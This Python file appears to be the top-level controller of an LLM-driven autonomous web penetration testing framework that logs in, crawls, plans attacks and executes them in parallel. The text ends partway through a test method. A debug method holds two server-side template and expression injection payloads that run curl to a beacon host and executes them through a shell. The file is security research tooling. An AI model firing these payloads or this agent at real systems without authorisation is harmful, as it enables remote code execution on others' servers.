"""
High-Level Decision Agent
Top-level decision agent for autonomous security testing
"""

import json
import time
import re
from pathlib import Path
from typing import Dict, Any, Optional, List
from datetime import datetime

from seleniumwire import webdriver
from selenium.webdriver.remote.webdriver import WebDriver

from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

from crawl.crawler import Crawler
from task.tasks import Task
from account.account_manager import AccountManager
from plan_agent.task_planning_agent import TaskPlanningAgent
from plan_agent.attack_planning_agent import AttackPlanningAgent
from attack_agent.attack_executor import AttackExecutor
from utils.token_tracker import tracker
# 🆕 No longer import specific agent classes (now created on-demand in AttackExecutor)

# Monkey patch to modify the original get method, avoiding old timeout errors that terminate the program
# Save the original get method
_original_get = WebDriver.get

# Define silent version of get method
def silent_get(self, url, modify=False):
    try:
        _original_get(self, url)
        # Some pages need a refresh
        # self.refresh()
        time.sleep(2)
        return True
    except Exception as e:  # Catch exception object e
        print(f"Silent failure for {url}, exception: {e}")  # Print exception info
        return False

# Replace the default get method
WebDriver.get = silent_get

def send(driver, cmd, params={}):
    return driver.execute_cdp_cmd(cmd, params)

def add_script(driver, script):
  send(driver, "Page.addScriptToEvaluateOnNewDocument", {"source": script})

WebDriver.add_script = add_script

class HighLevelDecisionAgent:
    """
    Top-level Decision Agent

    Workflow:
    1. Login - Execute login task
    2. Deep Crawl - Deep crawling (50 pages)
    3. Task Planning - Task planning
    4. Attack Planning - Attack planning
    5. Attack Execution - Attack execution
    6. Report Generation - Generate report
    """

    def __init__(self,
                 client,
                 initial_url: str,
                 login_task: Optional[str] = None,
                 crawl_start_url: Optional[str] = None,
                 output_dir: str = "output",
                 chrome_options = None,
                 config: Optional[Dict] = None,
                 target_domain: Optional[str] = None):  # 🆕 New parameter
        """
        Initialize the top-level decision agent.

        Args:
            client: OpenAI client
            initial_url: Target URL (login page or application homepage)
            login_task: Login task description (optional)
            crawl_start_url: Crawl start URL (optional, navigates to this URL after login to begin crawling)
            output_dir: Output directory
            chrome_options: Chrome options (optional)
            config: Configuration dictionary (optional), with the following configurable items:
                - crawl_max_pages: Maximum number of pages to crawl (default 50)
                - crawl_time_limit: Crawl time limit in seconds (default None, unlimited)
                - crawl_max_llm_workers: Maximum concurrent LLM workers during crawling (default 20)
                - task_planning_max_iterations: Maximum task planning iterations (default 200, previously 100)
                - task_planning_max_workers: Number of parallel workers for task execution (default 5)
                - attack_planning_max_iterations: Maximum attack planning iterations (default 100)
                - attack_planning_mode: Attack planning mode: "llm" (LLM intelligent planning, default) or "exhaustive" (exhaustive testing, for ablation experiments)
                - attack_execution_max_workers: Number of parallel workers for attack execution (default 10)
        """
        self.client = client
        self.initial_url = initial_url
        self.login_task = login_task
        self.crawl_start_url = crawl_start_url
        self.output_dir = Path(output_dir)
        self.chrome_options = chrome_options
        # 🆕 Determine target domain (prefer the passed-in value, otherwise extract from initial_url)
        if target_domain:
            self.target_domain = target_domain
            print(f"[DecisionAgent] Using provided target domain: {self.target_domain}")
        else:
            from urllib.parse import urlparse
            parsed = urlparse(initial_url)
            self.target_domain = parsed.hostname  # Extract domain (without port)
            print(f"[DecisionAgent] Auto-extracted target domain from initial_url: {self.target_domain}")

        self.config = {
            # Phase 2: Crawling
            "crawl_max_pages": 100,
            "crawl_time_limit": None,
            "crawl_max_llm_workers": 20,

            # Phase 3: Task Planning
            "task_planning_max_iterations": 100,  #
            "task_planning_max_workers": 10,

            # Phase 4: Attack Planning
            "attack_planning_max_iterations": 100,
            "attack_planning_mode": "llm",  # 🆕 Attack planning mode: "llm" (intelligent planning) or "exhaustive" (exhaustive testing)

            # Phase 5: Attack Execution
            "attack_execution_max_workers": 10,
        }

        # Override with user-provided configuration
        if config:
            self.config.update(config)

        # Create output directory structure
        self.dirs = {
            "crawl": self.output_dir / "crawl",
            "task_planning": self.output_dir / "task_planning",
            "attack_planning": self.output_dir / "attack_planning",
            "attack_execution": self.output_dir / "attack_execution",
            "attack_logs": self.output_dir / "attack_logs"
        }
        for dir_path in self.dirs.values():
            dir_path.mkdir(parents=True, exist_ok=True)

        # Log file
        self.log_path = self.output_dir / "high_level_agent.log"

        # Flag whether final report has been generated (avoid duplicate saves in _cleanup)
        self._final_report_saved = False

        # Initialize state
        self.state = {
            "current_phase": "init",
            "start_time": datetime.now().isoformat(),
            "initial_url": initial_url,
            "login_task": login_task,

            # Completion flags for each phase
            "login_complete": False,
            "crawl_complete": False,
            "task_planning_complete": False,
            "attack_planning_complete": False,
            "attack_execution_complete": False,

            # Statistics
            "pages_count": 0,
            "tasks_executed": 0,
            "attacks_planned": 0,
            "vulnerabilities_found": 0
        }

        # Shared components
        self.driver = None
        self.account_manager = None

        # Phase components
        self.crawler = None
        self.task_planner = None
        self.attack_planner = None
        self.executor = None
        # 🆕 Save worker drivers (passed from Task Planning to Attack phase)
        self.worker_drivers = []

        # Timing statistics
        self.phase_times = {}

    def _log(self, *args):
        """Log a message"""
        msg = " ".join(str(a) for a in args)
        print(msg)
        try:
            with open(self.log_path, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().isoformat()}] {msg}\n")
        except Exception:
            pass

    def _save_state(self):
        """Save current state"""
        state_path = self.output_dir / "agent_state.json"
        try:
            with open(state_path, 'w', encoding='utf-8') as f:
                json.dump(self.state, f, indent=2, ensure_ascii=False)
        except Exception as e:
            self._log(f"Warning: Failed to save state: {e}")

    def run(self) -> Dict[str, Any]:
        """Execute the complete automated testing workflow"""
        try:
            self._log("\n" + "="*70)
            self._log("🚀 Starting Autonomous Security Testing Framework")
            self._log("="*70)
            self._log(f"Target URL: {self.initial_url}")
            if self.login_task:
                self._log(f"Login task: {self.login_task}")
            else:
                self._log(f"Login task: None (direct crawling)")
            self._log("="*70 + "\n")

            # Initialize driver
            self._init_driver()

            # ✅ Initialize crawler early (Phase 1 needs crawler.run_a_task to execute login task)
            self.crawler = Crawler(
                driver=self.driver,
                client=self.client,
                initial_url=self.initial_url,
                target_domain=self.target_domain, # 🆕 Pass parameter
                store_root=str(self.dirs["crawl"])
            )

            # 2. Test xss() function
            # Send a signature string "TEST_INIT_BEACON"
            # self._log(f"[DEBUG] Executing browser-side JS: xss()")
            # self.driver.get(self.initial_url)
            # # execute_script here is synchronous; if xss function has issues it will throw directly
            # self.driver.execute_script("xss(4244564)")
            # self._log(f"[DEBUG] Browser-side JS execution complete")

            # Phase 1: Execute login (if login_task is provided)
            if self.login_task:
                self._phase_1_login()
            else:
                self._log("\n[Phase 1] Skipping login, proceeding directly to crawl phase")
                self.state["login_complete"] = False

            # ✅ DEBUG: Replay commands (comment out the line below when not needed)
            # self._debug_replay_commands()

            # ✅ TEST: Test independent driver creation (comment out the line below after verification)
            # self._test_create_cloned_drivers()

            # Phase 2: Deep crawl (reuse the already created crawler)
            self._phase_2_crawl()

            # Phase 3: Task planning
            self._phase_3_task_planning()

            # 🆕 Phase 4+5: Pipeline parallel attack (replaces the original Phase 4 and Phase 5)
            self._phase_4_5_pipeline_attack()

            # Generate final report
            self._generate_final_report()

            # Return results
            return {
                "crawling": {
                    "total_pages": self.state["pages_count"]
                },
                "testing": {
                    "tasks_executed": self.state["tasks_executed"],
                    "attacks_planned": self.state["attacks_planned"],
                    "vulnerabilities_found": self.state["vulnerabilities_found"]
                },
                "timing": {
                    "total_seconds": sum(self.phase_times.values())
                }
            }

        except Exception as e:
            self._log(f"\n❌ Testing workflow exception: {e}")
            import traceback
            self._log(traceback.format_exc())
            raise
        finally:
            self._cleanup()

    def _init_driver(self):
        """Initialize browser driver"""
        self._log("\n[Init] Starting browser...")

        if not self.chrome_options:
            chrome_options = webdriver.ChromeOptions()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-web-security")
            chrome_options.add_argument("--allow-running-insecure-content")
            chrome_options.add_argument("--disable-xss-auditor")
            self.chrome_options = chrome_options

        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=self.chrome_options)

        self.driver.set_page_load_timeout(60)
        self.driver.set_script_timeout(60)
        self.driver.set_window_size(1920, 1080)

        # Intercept external requests
        def interceptor(request):
            request_url = request.url
            # if '127.0.0.1' not in request_url and 'localhost' not in request_url:
            if self.target_domain not in request_url:
                request.abort()

        self.driver.request_interceptor = interceptor

        # ✅ Inject XSS detection script (critical fix)
        self.driver.add_script( open("js/xss_xhr.js", "r").read() )

        # ✅ Inject event listener capture script (new)
        # Note: lib.js must be loaded before addeventlistener_wrapper.js
        self.driver.add_script( open("js/md5.js", "r").read() )
        self.driver.add_script( open("js/lib.js", "r").read() )
        self.driver.add_script( open("js/addeventlistener_wrapper.js", "r").read() )
        self._log("[Init] Event listener capture script injected")

        self._log("[Init] Browser started successfully")

    def _phase_1_login(self):
        """Phase 1: Execute login task"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 1: Execute Login")
        self._log("="*70)
        self._log(f"Login page: {self.initial_url}")
        self._log(f"Task description: {self.login_task}")

        try:
            # ✅ Fix: Initialize AccountManager (using correct parameters)
            if not self.account_manager:
                self.account_manager = AccountManager(
                    store_path=str(self.output_dir / "accounts.json"),
                    chrome_options=self.chrome_options,
                    default_login_url=self.initial_url
                )

            # Navigate to login page
            self.driver.get(self.initial_url)
            time.sleep(2)

            # Create login task
            task = Task(
                task_id=1,
                description=self.login_task,
                initial_url=self.initial_url
            )

            # ✅ Save task object (used for Phase 5 login recovery)
            self.login_task_object = task

            # ✅ Fix: Execute login (using crawler.run_a_task)
            self._log("\n[Execute Login Task]")
            tracker.set_category("login_bridge")
            self.crawler.run_a_task(task, logging_in=True)

            # ✅ Extract credentials and create default_account
            self._log("\n[Create default_account]")
            time.sleep(1)  # Wait for page to stabilize
            credentials = self.account_manager._extract_credentials(self.driver)
            self.account_manager.create_account_from_credentials(
                account_id="default_account",
                credentials=credentials,
                role="main_user",
                login_url=self.initial_url
            )
            # Save driver reference
            self.account_manager.set_driver("default_account", self.driver)
            self._log("[default_account] Created and saved main driver credentials")

            # Update state
            self.state["login_complete"] = True
            self.state["current_phase"] = "login_complete"
            self._save_state()

            phase_duration = time.time() - phase_start
            self.phase_times["phase_1_login"] = phase_duration

            self._log(f"\n[Phase 1 Complete] Login successful")
            self._log(f"⏱️  Duration: {phase_duration:.1f}s")

        except Exception as e:
            self._log(f"\n❌ Login failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            raise

    def _phase_2_crawl(self):
        """Phase 2: Deep crawl (50 pages)"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 2: Deep Crawl")
        self._log("="*70)
        self._log(f"Parameters: max_pages={self.config['crawl_max_pages']}, time_limit={self.config['crawl_time_limit']}")

        # Determine start URL
        if self.crawl_start_url:
            # If a crawl start URL is specified, use it
            start_url = self.crawl_start_url
            self._log(f"Mode: Specified start URL crawl")
            # Navigate to specified URL
            self.driver.get(self.crawl_start_url)
            time.sleep(2)
        elif self.state.get("login_complete", False):
            # If logged in and no start URL specified, crawl from current page
            start_url = self.driver.current_url
            self._log(f"Mode: Authenticated crawl (starting from post-login page)")
        else:
            # If not logged in, crawl from initial URL
            start_url = self.initial_url
            self._log(f"Mode: Unauthenticated crawl (starting from target URL)")
            # Navigate to initial URL
            self.driver.get(self.initial_url)
            time.sleep(2)

        self._log(f"Start URL: {start_url}")

        # ✅ Fix: crawler was already created in run(), just need to update initial_url here
        # If start URL differs from creation time, update crawler's initial_url
        if start_url != self.crawler.initial_url:
            self._log(f"[Update crawler start URL] {self.crawler.initial_url} -> {start_url}")
            self.crawler.initial_url = start_url

        # Execute deep crawl
        tracker.set_category("crawl_bridge")
        self.crawler.crawl(
            max_pages=self.config["crawl_max_pages"],
            time_limit=self.config["crawl_time_limit"],
            max_llm_workers=self.config["crawl_max_llm_workers"]
        )

        # Export results
        self.crawler.export_task_plan_graph(
            output_path=str(self.dirs["crawl"] / "task_plan_graph.json")
        )

        # ✅ If not logged in (unauthenticated scenario), create default_account
        if not self.state.get("login_complete", False):
            self._log("\n[Create default_account (unauthenticated scenario)]")

            # Initialize AccountManager (if not already done)
            if not self.account_manager:
                self.account_manager = AccountManager(
                    store_path=str(self.output_dir / "accounts.json"),
                    chrome_options=self.chrome_options,
                    default_login_url=self.initial_url
                )

            # Extract current driver state (may be empty credentials)
            credentials = self.account_manager._extract_credentials(self.driver)
            self.account_manager.create_account_from_credentials(
                account_id="default_account",
                credentials=credentials,
                role="unauthenticated",
                login_url=self.initial_url
            )
            # Save driver reference
            self.account_manager.set_driver("default_account", self.driver)
            self._log("[default_account] Created (unauthenticated mode)")

        # Update state
        self.state["crawl_complete"] = True
        self.state["pages_count"] = len(self.crawler.store.pages)
        self.state["current_phase"] = "crawl_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_2_crawl"] = phase_duration

        self._log(f"\n[Phase 2 Complete] Discovered {self.state['pages_count']} pages")
        self._log(f"⏱️  Duration: {phase_duration:.1f}s")

    def _phase_3_task_planning(self, use_parallel: bool = True):
        """
        Phase 3: Task planning and execution

        Args:
            use_parallel: Whether to use parallel mode (default True)
                - True: Use 10 independent drivers for parallel task execution
                - False: Use serial mode (backward compatible)
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 3: Task Planning & Execution")
        self._log(f"Mode: {'Parallel' if use_parallel else 'Serial'}")
        self._log("="*70)

        # Initialize AccountManager (if not already done)
        if not self.account_manager:
            self.account_manager = AccountManager(
                store_path=str(self.output_dir / "accounts.json"),
                chrome_options=None,
                default_login_url=self.initial_url
            )

        # Create TaskPlanningAgent
        self.task_planner = TaskPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager
        )

        # Choose execution method based on mode
        if use_parallel:
            # ===== Parallel mode =====
            self._log(f"\n[Parallel Mode] Using {self.config['task_planning_max_workers']} independent drivers for parallel task execution")

            try:
                from parallel.parallel_task_scheduler import ParallelTaskScheduler

                scheduler = ParallelTaskScheduler(
                    crawler=self.crawler,
                    task_planning_agent=self.task_planner,
                    account_manager=self.account_manager,
                    client=self.client,
                    max_workers=self.config["task_planning_max_workers"]
                )

                # task_exec_bridge is the default category for Bridge calls in this phase;
                # TaskPlanningAgent._call_llm internally uses tracker.phase("task_planning") to temporarily switch
                tracker.set_category("task_exec_bridge")
                result = scheduler.run(max_iterations=self.config["task_planning_max_iterations"], target_domain=self.target_domain)

                # Count results
                total_tasks = result.get("total_pages", 0)  # Parallel mode returns the number of pages executed

                # 🆕 Save worker drivers (don't destroy, pass to Attack phase)
                self.worker_drivers = scheduler.get_worker_drivers()
                self._log(f"\n[Worker Drivers] Saved {len(self.worker_drivers)} driver(s) for attack phase")

            except Exception as e:
                self._log(f"\n[Parallel Mode] ✗ Execution failed, falling back to serial mode: {e}")
                import traceback
                traceback.print_exc()

                # Fall back to serial mode
                result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
                total_tasks = result['total_tasks']

        else:
            # ===== Serial mode (original logic) =====
            self._log("\n[Serial Mode] Using main driver for serial task execution")
            tracker.set_category("task_exec_bridge")
            result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
            total_tasks = result['total_tasks']

        # Save results
        self.crawler.export_execution_graph_with_requests(
            output_path=str(self.dirs["task_planning"] / "execution_graph_with_requests.json")
        )

        # Update state
        self.state["task_planning_complete"] = True
        self.state["tasks_executed"] = total_tasks
        self.state["current_phase"] = "task_planning_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_3_task_planning"] = phase_duration

        self._log(f"\n[Phase 3 Complete] Tasks/pages executed: {total_tasks}")
        self._log(f"⏱️  Duration: {phase_duration:.1f}s")

    def _phase_4_5_pipeline_attack(self):
        """
        🆕 Phase 4+5: Pipeline parallel attack (Attack Planning + Execution Pipeline)

        Improvements:
        - Phase 4 and Phase 5 run simultaneously
        - Phase 4 continuously generates tasks -> puts them into a queue
        - Phase 5 consumes tasks from the queue -> executes in parallel (10 workers)
        - Expected: Phase 4 (3 min) overlaps with Phase 5 (3 min) -> total ~3 min
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 4+5: Pipeline Parallel Attack (Attack Planning + Execution Pipeline)")
        self._log("="*70)
        self._log("Mode: Phase 4 (Planning) and Phase 5 (Execution) run in parallel")
        self._log("  - Planning thread: Continuously generates tasks and puts them into a queue")
        self._log("  - Execution thread pool: 10 workers concurrently execute tasks")
        self._log("="*70 + "\n")

        # Create task queue
        import queue
        import threading

        task_queue = queue.Queue(maxsize=100)  # Limit queue size to avoid memory overflow

        # ⚠️ Disabled: periodic keep-alive thread (because each task already has a keep-alive operation at start)
        # 🆕 Start Session keep-alive thread (keep main driver's session active)
        # from utils.session_keepalive import SessionKeepAliveThread

        # keepalive_thread = SessionKeepAliveThread(
        #     driver=self.driver,
        #     initial_url=self.crawler.initial_url,  # 🆕 Fixed: visit the post-login initial page
        #     screenshot_dir=str(self.dirs["attack_execution"] / "session_keepalive"),
        #     interval=60  # Visit a random page every 60 seconds
        # )
        # keepalive_thread.start()
        # self._log("[KeepAlive] Session keep-alive thread started (visits initial page and takes screenshot every 60s)\n")

        # Create AttackPlanningAgent
        self.attack_planner = AttackPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager,
            ctf_description=None,
            default_account="default_account",
            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
        )

        # ✅ Start Phase 4 planning thread (producer)
        def planning_worker():
            """Planning thread: continuously generates tasks and puts them into the queue"""
            try:
                self._log("[Phase 4 Thread] Starting attack planning...")
                result = self.attack_planner.plan_and_stream(task_queue, max_iterations=self.config["attack_planning_max_iterations"])
                self._log(f"[Phase 4 Thread] Planning complete - {result['total_tasks_generated']} tasks generated")
                return result
            except Exception as e:
                self._log(f"[Phase 4 Thread] Error: {e}")
                import traceback
                self._log(traceback.format_exc())
                # Send termination signal (notify executor even on failure)
                task_queue.put(None)
                return None

        planning_thread = threading.Thread(target=planning_worker, daemon=False)
        planning_thread.start()
        self._log("[Phase 4 Thread] Planning thread started\n")

        # ✅ Phase 5 executes in main thread (consumer)
        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
        # Create AttackExecutor
        from attack_agent.attack_executor import AttackExecutor

        self.executor = AttackExecutor(
            account_manager=self.account_manager,
            crawler=self.crawler,
            client=self.client,
            driver=self.driver,
            beacon_base="http://172.17.0.1:9091/",  # 🆕 Unified beacon URL
            log_dir=str(self.dirs["attack_execution"]),
            edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers
            chrome_options=self.chrome_options,  # 🆕 Pass chrome options (for creating drivers)
            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
            login_task=getattr(self, 'login_task_object', None),  # ✅ Fix: Pass Task object instead of string
            target_domain=self.target_domain  # ✅ Add this critical parameter!
        )

        # ✅ Execute tasks (consume from queue)
        self._log("[Phase 5 Main Thread] Starting attack execution from queue...\n")
        try:
            execution_results = self.executor.execute_tasks_from_queue(
                task_queue,
                max_workers=self.config["attack_execution_max_workers"]
            )
        except KeyboardInterrupt:
            self._log("\n⚠️  Phase 4+5 interrupted by user (Ctrl+C)")
            execution_results = getattr(self.executor, 'results', [])
        finally:
            # Regardless of normal completion or Ctrl+C, immediately record attack phase time
            attack_duration = getattr(self.executor, '_phase1_duration', time.time() - phase_start)
            self.phase_times["phase_4_5_attack"] = attack_duration
            self._log(f"\n⏱️  Attack planning+execution duration: {attack_duration:.1f}s")

        # ✅ Wait for planning thread to complete
        self._log("\n[Main Thread] Waiting for planning thread to finish...")
        planning_thread.join(timeout=300)  # Wait up to 5 minutes
        if planning_thread.is_alive():
            self._log("[Main Thread] Warning: Planning thread still running after 5 minutes")
        else:
            self._log("[Main Thread] Planning thread finished")

        # ⚠️ Disabled: stop periodic keep-alive thread
        # 🆕 Stop Session keep-alive thread
        # self._log("\n[KeepAlive] Stopping session keep-alive thread...")
        # keepalive_thread.stop()
        # self._log("[KeepAlive] Session keep-alive thread stopped\n")

        # Count vulnerabilities
        vulnerabilities = sum(
            1 for r in execution_results
            if r.get('result', {}).get('vulnerable') is True
        )

        # Update state
        self.state["attack_planning_complete"] = True
        self.state["attack_execution_complete"] = True
        self.state["attacks_planned"] = len(execution_results)
        self.state["vulnerabilities_found"] = vulnerabilities
        self.state["current_phase"] = "pipeline_attack_complete"
        self._save_state()

        phase_duration = time.time() - phase_start

        # Read phase-specific times from executor, separate attack execution and patrol
        patrol_duration = getattr(self.executor, '_phase2_duration', 0)

        self.phase_times["phase_4_5_attack"] = attack_duration  # Override with Phase 1 precise time
        self.phase_times["phase_4_5_patrol"] = patrol_duration

        self._log(f"\n[Phase 4+5 Complete] Vulnerabilities found: {vulnerabilities}")
        self._log(f"⏱️  Attack planning+execution duration: {attack_duration:.1f}s")
        self._log(f"⏱️  Stored vulnerability patrol duration: {patrol_duration:.1f}s")
        self._log(f"⏱️  Total duration: {phase_duration:.1f}s")
        self._log(f"💡 Performance improvement: Pipeline parallel mode significantly reduces testing time")

        # Save results for report use
        self.execution_results = execution_results

    def _phase_4_attack_planning(self):
        """
        ⚠️  Deprecated: Please use _phase_4_5_pipeline_attack()

        Phase 4: Attack planning (standalone execution mode)
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 4: Attack Planning")
        self._log("="*70)

        # Create AttackPlanningAgent
        self.attack_planner = AttackPlanningAgent(
            client=self.client,
            crawler=self.crawler,
            account_manager=self.account_manager,
            ctf_description=None,
            default_account="default_account",
            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
        )

        # Execute attack planning
        result = self.attack_planner.plan_and_execute()

        # Save results
        serialized_tasks = [
            {
                "task_id": task.task_id,
                "task_description": task.task_description,
                "vuln_type": task.vuln_type,
                "target_request": task.target_request,
                "account_identifier": task.account_identifier
            }
            for task in result['all_tasks']
        ]

        with open(self.dirs["attack_planning"] / "attack_tasks.json", 'w', encoding='utf-8') as f:
            json.dump(serialized_tasks, f, indent=2, ensure_ascii=False)

        # Update state
        self.state["attack_planning_complete"] = True
        self.state["attacks_planned"] = len(result['all_tasks'])
        self.state["current_phase"] = "attack_planning_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_4_attack_planning"] = phase_duration

        self._log(f"\n[Phase 4 Complete] Attack tasks generated: {len(result['all_tasks'])}")
        self._log(f"⏱️  Duration: {phase_duration:.1f}s")

        # Save attack_planner results for later use
        self.attack_tasks = result['all_tasks']

    def _phase_5_attack_execution(self):
        """Phase 5: Attack execution (🆕 parallel mode)

        ⚠️  Deprecated: Recommend using _phase_4_5_pipeline_attack() pipeline mode
        """
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Phase 5: Attack Execution (PARALLEL MODE)")
        self._log("="*70)

        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
        # Create AttackExecutor
        self.executor = AttackExecutor(
            account_manager=self.account_manager,
            crawler=self.crawler,
            client=self.client,
            driver=self.driver,
            beacon_base="http://172.17.0.1:9091/",
            log_dir=str(self.dirs["attack_execution"]),
            edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers (supported even in old method)
            chrome_options=self.chrome_options,  # 🆕 Pass chrome options
            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
            login_task=self.login_task,          # 🆕 Pass login task
            target_domain=self.target_domain  # ✅ Add this critical parameter!
        )

        # 🆕 Use parallel execution method
        self._log(f"\n[Parallel Execution Mode] Max concurrency: {self.config['attack_execution_max_workers']}")
        self._log(f"[Total Tasks] {len(self.attack_tasks)}")
        execution_results = self.executor.execute_tasks_parallel(
            self.attack_tasks,
            max_workers=self.config["attack_execution_max_workers"]
        )

        # Count vulnerabilities
        vulnerabilities = sum(
            1 for r in execution_results
            if r.get('result', {}).get('vulnerable') is True
        )

        # Update state
        self.state["attack_execution_complete"] = True
        self.state["vulnerabilities_found"] = vulnerabilities
        self.state["current_phase"] = "attack_execution_complete"
        self._save_state()

        phase_duration = time.time() - phase_start
        self.phase_times["phase_5_attack_execution"] = phase_duration

        self._log(f"\n[Phase 5 Complete] Vulnerabilities found: {vulnerabilities}")
        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
        self._log(f"💡 Performance improvement: Parallel mode significantly reduces testing time")

        # Save results for report use
        self.execution_results = execution_results

    def _generate_final_report(self):
        """Generate final report"""
        phase_start = time.time()

        self._log("\n" + "="*70)
        self._log("Generate Final Report")
        self._log("="*70)

        # Calculate total time
        total_duration = sum(self.phase_times.values())

        # Build report
        report = {
            "metadata": {
                "target_url": self.initial_url,
                "start_time": self.state["start_time"],
                "end_time": datetime.now().isoformat(),
                "total_duration_seconds": total_duration,
                "output_directory": str(self.output_dir)
            },
            "crawling": {
                "total_pages": self.state["pages_count"]
            },
            "testing": {
                "tasks_executed": self.state["tasks_executed"],
                "attacks_planned": self.state["attacks_planned"],
                "vulnerabilities_found": self.state["vulnerabilities_found"]
            },
            "timing": {
                "total_seconds": total_duration,
                "phases": self.phase_times
            },
            "token_usage": tracker.get_summary(),
            "accounts": [
                {
                    "account_id": acc.account_id,
                    "role": acc.role,
                    "is_logged_in": acc.is_logged_in
                }
                for acc in self.account_manager.list_accounts()
            ] if self.account_manager else []
        }

        # Save report
        report_path = self.output_dir / "final_report.json"
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # Additionally save token usage file separately (for easy reference)
        token_usage_path = self.output_dir / "token_usage.json"
        with open(token_usage_path, 'w', encoding='utf-8') as f:
            json.dump(report["token_usage"], f, indent=2, ensure_ascii=False)

        # Print token usage summary to console
        tracker.print_summary()

        # Mark that token data has been saved by this function; _cleanup does not need to save again
        self._final_report_saved = True

        phase_duration = time.time() - phase_start
        self.phase_times["report_generation"] = phase_duration

        self._log(f"\n[Report Generation Complete] Report saved: {report_path}")
        self._log(f"⏱️  Duration: {phase_duration:.1f}s")


    def _debug_replay_commands(self):
        """
        Debug function: replay specified curl commands (for testing).

        Usage:
        1. Modify the commands in the debug_commands list
        2. Call this function before crawling in run()
        3. Simply comment out the call when not needed
        """
        self._log("\n" + "="*70)
        self._log("[DEBUG] Replaying Commands")
        self._log("="*70)

        # ✅ Define the list of commands to replay here
        debug_commands = [
        "curl -s 'http://127.0.0.1:4288/Users/{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('curl http://172.17.0.1:9091/?data=loudongyanzheng').read()}}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
        "curl -s 'http://127.0.0.1:4288/Users/${T(java.lang.Runtime).getRuntime().exec('curl http://172.17.0.1:9091/?data=loudongyanzheng')}/Items?SortBy=IsFavoriteOrLiked%2CRandom&IncludeItemTypes=Movie%2CSeries%2CMusicArtist&Limit=20&Recursive=true&ImageTypeLimit=0&EnableImages=false&ParentId=3227ce1e069754c594af25ea66d69fc7&EnableTotalRecordCount=false' -g",
        ]

        # ✅ Type check: ensure each element is a string
        flattened_commands = []
        for item in debug_commands:
            if isinstance(item, list):
                # If nested list, flatten it
                flattened_commands.extend(item)
            elif isinstance(item, str):
                flattened_commands.append(item)
            else:
                self._log(f"[DEBUG] ⚠️  Skipping invalid item type: {type(item)}")

        if not flattened_commands:
            self._log("[DEBUG] ✗ No valid commands after flattening")
            return

        # Get credentials from default_account
        if not self.account_manager:
            self._log("[DEBUG] ✗ AccountManager not initialized")
            return

        credentials = self.account_manager.get_credentials("default_account")
        if not credentials:
            self._log("[DEBUG] ✗ No credentials found for default_account")
            return

        self._log(f"[DEBUG] ✓ Credentials obtained for default_account")
        self._log(f"[DEBUG] Replaying {len(flattened_commands)} command(s)\n")

        # Import necessary functions
        from attack_agent.request_utils import append_credentials_to_curl
        import subprocess

        # Execute each command
        for idx, cmd in enumerate(flattened_commands, 1):
            # ✅ Confirm type again
            if not isinstance(cmd, str):
                self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}] ✗ Invalid type: {type(cmd)}, skipping")
                continue

            self._log(f"[DEBUG Command {idx}/{len(flattened_commands)}]")
            cmd_preview = cmd[:100] + "..." if len(cmd) > 100 else cmd
            self._log(f"  Original: {cmd_preview}")

            # Add credentials
            try:
                cmd_with_creds = append_credentials_to_curl(cmd, credentials)
                creds_preview = cmd_with_creds[:150] + "..." if len(cmd_with_creds) > 150 else cmd_with_creds
                self._log(f"  With Credentials: {creds_preview}")
            except Exception as e:
                self._log(f"  ✗ Failed to add credentials: {e}")
                continue

            # Execute command
            try:
                process = subprocess.Popen(
                    cmd_with_creds,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=15)

                self._log(f"  ✓ Executed (status={process.returncode})")
                self._log(f"  [STDOUT length: {len(stdout)}]")
                if stdout:
                    preview = stdout[:500] if len(stdout) > 500 else stdout
                    self._log(f"  [STDOUT preview]: {preview}")
                    if len(stdout) > 500:
                        self._log(f"  ... (truncated, total {len(stdout)} chars)")

                if stderr:
                    self._log(f"  [STDERR]: {stderr[:200]}")

            except subprocess.TimeoutExpired:
                self._log(f"  ✗ Timeout after 15s")
            except Exception as e:
                self._log(f"  ✗ Error: {e}")

            self._log("")

        self._log("="*70)
        self._log(f"[DEBUG] Replay Complete - {len(flattened_commands)} command(s) processed\n")

    def _test_create_cloned_drivers(self):
        """
